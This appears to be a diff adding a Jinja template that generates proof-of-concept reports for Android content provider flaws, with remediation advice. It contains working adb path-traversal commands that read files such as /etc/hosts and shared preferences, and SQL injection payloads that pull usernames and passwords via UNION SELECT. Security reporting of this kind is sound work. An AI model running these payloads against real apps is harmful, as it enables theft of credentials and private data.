@@ -1,0 +1,83 @@
+# PoC: Content Provider Vulnerability — {{ finding.title }}
+
+## Classification
+| Field | Value |
+|---|---|
+| **CWE** | {{ cwe }} |
+| **Severity** | {{ severity }} |
+| **CVSS** | {{ cvss }} |
+| **Component** | {{ class_name }} |
+
+## Description
+{{ description }}
+
+## Prerequisites
+- Rooted Android device or emulator with ADB access
+- Target app (`{{ package_name }}`) installed
+- `adb` command-line tool
+
+## Steps to Reproduce
+
+### 1. Identify the Content Provider
+```bash
+# List exported content providers
+adb shell dumpsys package {{ package_name }} | grep -A 5 "ContentProvider"
+```
+
+### 2. Query the Content Provider
+```bash
+# Attempt to query the provider URI
+adb shell content query --uri content://{{ package_name }}.provider/
+
+# Try common path variations
+adb shell content query --uri content://{{ class_name }}/
+```
+
+{% if "CWE-22" in cwe %}
+### 3. Test Path Traversal
+```bash
+# Attempt directory traversal
+adb shell content read --uri "content://{{ class_name }}/../../../etc/hosts"
+adb shell content read --uri "content://{{ class_name }}/..%2F..%2F..%2Fetc%2Fhosts"
+
+# Try to access app private data
+adb shell content read --uri "content://{{ class_name }}/../shared_prefs/preferences.xml"
+```
+{% endif %}
+
+{% if "CWE-89" in cwe %}
+### 3. Test SQL Injection
+```bash
+# Basic SQL injection test
+adb shell content query --uri "content://{{ class_name }}/" --where "1=1 OR 1=1"
+
+# Union-based extraction
+adb shell content query --uri "content://{{ class_name }}/" --where "1=1) UNION SELECT sql,2,3 FROM sqlite_master--"
+
+# Attempt to read other tables
+adb shell content query --uri "content://{{ class_name }}/" --where "1=1) UNION SELECT username,password,3 FROM users--"
+```
+{% endif %}
+
+### 4. Verify with Frida (Optional)
+```bash
+# Hook the content provider's query/openFile method to observe behavior
+frida -U -f {{ package_name }} -l content_provider_hook.js --no-pause
+```
+
+## Expected Result
+- The content provider should return data or file access without proper authorization checks
+- Path traversal should allow reading files outside the intended directory
+- SQL injection should return data from other tables or database metadata
+
+## Impact
+{% if "CWE-22" in cwe %}
+An attacker app on the same device can read arbitrary files from the target app's private storage, including databases, shared preferences, and authentication tokens.
+{% elif "CWE-89" in cwe %}
+An attacker can extract sensitive data from the app's database, including user credentials, session tokens, and personal information.
+{% else %}
+Unauthorized access to the app's content provider allows data exfiltration without user consent.
+{% endif %}
+
+## Remediation
+{{ remediation or "1. Validate and sanitize all URI paths using `Uri.getLastPathSegment()` and canonicalization\n2. Use parameterized queries instead of string concatenation\n3. Set `android:exported=\"false\"` if the provider doesn't need external access\n4. Implement proper permission checks with `android:permission` attribute" }}
